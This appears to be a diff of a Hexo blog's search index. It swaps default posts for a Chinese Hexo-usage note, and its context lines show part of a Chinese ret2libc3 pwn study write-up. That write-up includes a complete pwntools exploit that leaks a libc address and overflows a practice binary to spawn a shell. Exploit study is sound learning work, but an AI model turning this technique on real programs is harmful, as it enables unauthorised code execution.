@@ -1,33 +1,6 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
-    <title>Hello World</title>
-    <url>/2025/06/05/hello-world/</url>
-    <content><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-
-<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
-]]></content>
-  </entry>
-  <entry>
-    <title>myblog</title>
-    <url>/2025/06/05/myblog/</url>
-    <content><![CDATA[<p>这是我的第二篇 Hexo 博客文章，下面写正文……</p>
-]]></content>
-      <tags>
-        <tag>test</tag>
-      </tags>
-  </entry>
-  <entry>
     <title></title>
     <url>/2025/06/25/ret2%E7%9A%84%E5%87%A0%E7%A7%8D%E6%94%BB%E5%87%BB%E5%8E%9F%E7%90%86%E6%80%BB%E7%BB%93/</url>
     <content><![CDATA[<h1 id="ret2的几种攻击原理总结"><a href="#ret2的几种攻击原理总结" class="headerlink" title="ret2的几种攻击原理总结"></a>ret2的几种攻击原理总结</h1><p>主要是对ret2libc3的详细过程总结</p>
@@ -135,6 +108,24 @@
 <h3 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&quot;./ret2libc3&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,<span class="built_in">str</span>(elf.got[<span class="string">&quot;puts&quot;</span>]).encode())</span><br><span class="line">io.recvuntil(<span class="string">b&quot; : &quot;</span>)</span><br><span class="line">libcBase=<span class="built_in">int</span>(io.recvuntil(<span class="string">b&quot;\n&quot;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-libc.symbols[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line"></span><br><span class="line">success(<span class="string">&quot;libcBase -&gt; &#123;:#x&#125;&quot;</span>.<span class="built_in">format</span>(libcBase))</span><br><span class="line"></span><br><span class="line">payload=flat([cyclic(<span class="number">60</span>),libcBase+libc.symbols[<span class="string">&quot;system&quot;</span>],<span class="number">0xdeadbeef</span>,<span class="built_in">next</span>(elf.search(<span class="string">b&quot;sh\x00&quot;</span>))])</span><br><span class="line">io.sendlineafter(<span class="string">b&quot; :&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>其中libc已经和视频课中给出的不同了，我们要用ldd指令进行查看，查看之后将查看出的路径填入libc</p>
+]]></content>
+  </entry>
+  <entry>
+    <title>博客</title>
+    <url>/2025/06/25/%E5%8D%9A%E5%AE%A2/</url>
+    <content><![CDATA[<p>在每个博客最前面都要添加下面的开头内容（在源代码模式下）</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---</span><br><span class="line">title: ret2的几种攻击原理总结</span><br><span class="line">date: 2025-06-25 14:52</span><br><span class="line">tags:</span><br><span class="line">  - Pwn</span><br><span class="line">    categories:Pwn</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
+
+
+
+<p>新建博客提交</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#清除缓存</span></span><br><span class="line"><span class="variable">$hexo</span> c</span><br><span class="line"><span class="comment">#新建静态文件</span></span><br><span class="line"><span class="variable">$hexo</span> g</span><br><span class="line"><span class="comment">#提交文件</span></span><br><span class="line"><span class="variable">$hexo</span> d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>常用命令</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">hexo new <span class="string">&quot;name&quot;</span>       <span class="comment"># 新建文章</span></span><br><span class="line">hexo new page <span class="string">&quot;name&quot;</span>  <span class="comment"># 新建页面</span></span><br><span class="line">hexo g                <span class="comment"># 生成页面</span></span><br><span class="line">hexo d                <span class="comment"># 部署</span></span><br><span class="line">hexo g -d             <span class="comment"># 生成页面并部署</span></span><br><span class="line">hexo s                <span class="comment"># 本地预览</span></span><br><span class="line">hexo clean            <span class="comment"># 清除缓存和已生成的静态文件</span></span><br><span class="line">hexo <span class="built_in">help</span>             <span class="comment"># 帮助</span></span><br></pre></td></tr></table></figure>
+
 ]]></content>
   </entry>
 </search>
